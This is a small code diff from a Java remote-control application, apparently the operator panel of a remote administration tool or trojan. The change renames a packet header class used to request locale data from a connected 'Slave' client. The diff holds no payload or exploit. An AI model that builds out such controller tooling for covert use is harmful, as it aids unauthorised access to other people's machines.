@@ -13,7 +13,7 @@ import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Locale;
 import com.redpois0n.Slave;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.ui.renderers.table.LocaleTableRenderer;
 import com.redpois0n.utils.FlagUtils;
 
@@ -110,7 +110,7 @@ public class PanelControlLocales extends PanelControlParent {
 		setLayout(groupLayout);
 		
 		if (slave.getLocales() == null) {
-			slave.addToSendQueue(Header.LOCALES);
+			slave.addToSendQueue(OutgoingHeader.LOCALES);
 		} else {
 			load();
 		}
